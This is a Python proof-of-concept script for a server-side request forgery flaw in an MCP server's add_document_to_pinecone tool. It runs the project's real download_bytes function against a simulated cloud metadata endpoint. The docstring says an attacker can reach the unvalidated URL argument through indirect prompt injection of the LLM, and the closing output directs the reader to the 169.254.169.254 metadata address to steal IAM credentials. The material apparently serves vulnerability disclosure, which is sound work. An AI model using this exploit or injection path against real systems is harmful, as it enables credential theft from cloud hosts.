"""
PoC: SSRF in the Momentum FHIR MCP Server.

The `add_document_to_pinecone` tool accepts an unvalidated `url` (schema Document.url: str)
which flows: add_document_to_pinecone -> document_processor.process_document ->
download_bytes(url) -> requests.get(url), with no scheme/host allowlist, no block on
internal/link-local addresses, and no timeout.

An LLM tool argument (reachable via indirect prompt injection; search_pinecone even
auto-triggers add_document_to_pinecone) can make the server fetch any URL — e.g. the cloud
metadata endpoint http://169.254.169.254/... to steal IAM credentials.

This runs the project's EXACT download_bytes source (extracted verbatim via AST, so the
heavy RAG stack does not need to be installed) against a simulated internal endpoint.
"""
import ast
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

import requests

TARGET = "fhir-mcp-server/app/services/rag/document_service.py"

# ── Load the real download_bytes() source verbatim ─────────────────────────────
src = open(TARGET).read()
node = next(n for n in ast.parse(src).body
            if isinstance(n, ast.FunctionDef) and n.name == "download_bytes")
func_src = ast.get_source_segment(src, node)
print("=== running this exact function from document_service.py ===")
print(func_src, "\n")
ns = {"requests": requests}
exec(func_src, ns)
download_bytes = ns["download_bytes"]

# ── Simulate an internal-only service the server should never reach (e.g. cloud IMDS) ──
HIT = {}
class IMDS(BaseHTTPRequestHandler):
    def do_GET(self):
        HIT["path"] = self.path
        body = b'{"AccessKeyId":"ASIA-STOLEN","SecretAccessKey":"s3cr3t","Token":"..."}'
        self.send_response(200); self.end_headers(); self.wfile.write(body)
    def log_message(self, *a): pass

srv = HTTPServer(("127.0.0.1", 0), IMDS)
port = srv.server_address[1]
threading.Thread(target=srv.serve_forever, daemon=True).start()

# ── Attacker-supplied `url` (as an LLM tool arg) pointed at the internal endpoint ──
attacker_url = f"http://127.0.0.1:{port}/latest/meta-data/iam/security-credentials/role"
data = download_bytes(attacker_url)

print(f"internal endpoint was reached: {HIT.get('path')!r}")
print(f"server fetched attacker URL and returned its body to the app: {data.decode()}")
print(f"\n>>> SSRF CONFIRMED: arbitrary-URL fetch, no allowlist/timeout. "
      f"Point `url` at http://169.254.169.254/... on a cloud host to steal IAM credentials.")
